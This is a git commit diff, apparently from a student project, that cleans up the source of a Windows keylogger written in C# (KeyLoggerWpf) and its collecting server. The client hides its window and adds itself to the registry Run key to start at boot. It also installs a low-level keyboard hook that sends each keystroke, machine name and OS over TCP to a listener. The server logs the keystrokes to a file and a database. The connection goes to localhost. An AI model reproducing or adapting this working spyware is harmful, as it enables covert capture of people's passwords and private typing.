1e39f9a8b2aa4186314f920c8f7ec95450963bc9
MixalMalinskiy <mishakakto1233@gmail.com>
2020-11-30 21:14:47 +0200

    End Project ClearCode

--- KeyLoggerWpf/MainWindow.xaml.cs
+++ KeyLoggerWpf/MainWindow.xaml.cs
@@ -2,11 +2,8 @@
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
-using System.Threading;
 using System.Net.Sockets;
-using System.Text;
 using System.IO;
-using System.Threading.Tasks;
 using System.Net;
 using Microsoft.Win32;
 using System.Windows;
@@ -21,13 +18,10 @@ namespace KeyLoggerWpf
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-
         static StreamWriter writer;
-
-
-
         static TcpClient tcpclient;
 
        
@@ -35,22 +29,18 @@ namespace KeyLoggerWpf
         {
             InitializeComponent();
             this.Visibility = Visibility.Hidden;
-            // Добавление в автозагрузку
+           
             string ExePath = AppDomain.CurrentDomain.BaseDirectory;
             string name = "KeyLogger";
             RegistryKey reg;
             reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
             reg.SetValue(name, ExePath);
-          
-           
+                     
             tcpclient = new TcpClient(AddressFamily.InterNetwork);
             tcpclient.Connect(IPAddress.Parse("127.0.0.1"), 10000);
             writer = new StreamWriter(tcpclient.GetStream());
 
-
-
             _hookID = SetHook(_proc);
-
 
             Closed += MainWindow_Closed;
         }
@@ -59,7 +49,6 @@ namespace KeyLoggerWpf
         {
             UnhookWindowsHookEx(_hookID);
         }
-
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -72,21 +61,16 @@ namespace KeyLoggerWpf
 
         private delegate IntPtr LowLevelKeyboardProc(
             int nCode, IntPtr wParam, IntPtr lParam);
-
-        private static IntPtr HookCallback(
-            int nCode, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                // Console.WriteLine((Keys)vkCode + " " + DateTime.Now);
-
-
+               
                 var p = $"{Convert.ToInt32(PackageType.Send)};{(Keys)vkCode};{Environment.MachineName};{Convert.ToString(System.Runtime.InteropServices.RuntimeInformation.OSDescription)}";
 
-                writer.Write(p);
-                writer.Flush();
+                writer.WriteAsync(p);
+                writer.FlushAsync();
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
--- Server/MainWindow.xaml.cs
+++ Server/MainWindow.xaml.cs
@@ -1,24 +1,13 @@
 ﻿using KeyLogger;
 using System;
-using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.IO;
-using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Forms;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
 using System.Xml.Serialization;
 
 namespace Server
@@ -29,28 +18,22 @@ namespace Server
     public partial class MainWindow : Window
     {
         StreamReader reader;
-         StreamWriter writer;
+        StreamWriter writer;
         TcpClient tcp = new TcpClient();
         TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"),10000);
         CancellationTokenSource source;
         Task recieveTask;
         PackegeContext db = new PackegeContext();
         ObservableCollection<Package> packages = new ObservableCollection<Package>();
-
         System.Windows.Forms.NotifyIcon ni = new System.Windows.Forms.NotifyIcon();
         XmlSerializer formatter = new XmlSerializer(typeof(Package));
 
-
         public MainWindow()
         {
-
-
             ni.Icon = new System.Drawing.Icon("gato_icon_134883 (1).ico");
+
             InitializeComponent();
             DataContext = this;
-
-           
-
             listener.Start();
 
 
@@ -76,10 +59,10 @@ namespace Server
             writer = new StreamWriter(ns);
             source = new CancellationTokenSource();
             writer.AutoFlush = true;
-             recieveTask = Task.Factory.StartNew(() => { Receved(source.Token); });
+            recieveTask = Task.Factory.StartNew(() => { Receved(source.Token); });
 
         }
-        private void Receved(CancellationToken token)
+        private async void Receved(CancellationToken token)
         {
             while (true)
             {
@@ -97,48 +80,20 @@ namespace Server
                 switch (pt)
                 {
                     case PackageType.Send:
-                        {
-
-
-
-
-
-                          
-                            // eror
+                        {                         
                             var p = new Package() { Char = ss[1], Date = DateTime.Now.ToLongTimeString(), MachineName = ss[2], OS = ss[3] };
-                            File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");
-                           
-                            Dispatcher.Invoke(() => { packages.Add(p); });
-                           
-                           
-
-
-
-                                    db.Packages.Add(p);
-                                    db.SaveChanges();
-                           
-                            
-                                                       
-
-
-
-
-
-
-
-
-
-
+                            File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");                          
+                            await Dispatcher.InvokeAsync(() => { packages.Add(p); });                                                  
+                            db.Packages.Add(p);
+                            await db.SaveChangesAsync();                                               
                         }
                         break;
-
                 }
             }
         }
 
-        private void Button_Click(object sender, RoutedEventArgs e)
+        private void Hide_Click(object sender, RoutedEventArgs e)
         {
-
             ni.Visible = true;
             ni.DoubleClick += (sndr, args) =>
             {
@@ -146,30 +101,25 @@ namespace Server
                 this.WindowState = WindowState.Normal;
             };
             this.Hide();
-
         }
 
-        private void Button_Click_1(object sender, RoutedEventArgs e)
+        private async void Show_Click(object sender, RoutedEventArgs e)
         {
-           // db.Dispose();
             foreach (var item in db.Packages)
             {
                 var p = new Package() { Char = item.Char, Date = item.Date, MachineName = item.MachineName, OS = item.OS};
-                //File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");
-
-                Dispatcher.Invoke(() => { packages.Add(p); });
+               
+                await Dispatcher.InvokeAsync(() => { packages.Add(p); });
             }
         }
 
-        private void Button_Click_2(object sender, RoutedEventArgs e)
+        private async void Button_Click_2(object sender, RoutedEventArgs e)
         {
             foreach (var item in db.Packages)
             {
-                var p = new Package() { Char = item.Char, Date = item.Date, MachineName = item.MachineName, OS = item.OS };
-                //File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");
+                var p = new Package() { Char = item.Char, Date = item.Date, MachineName = item.MachineName, OS = item.OS };               
 
-                Dispatcher.Invoke(() => { packages.Remove(p); });
-                 
+                await Dispatcher.InvokeAsync(() => { packages.Remove(p); });                
             }
         }
     }
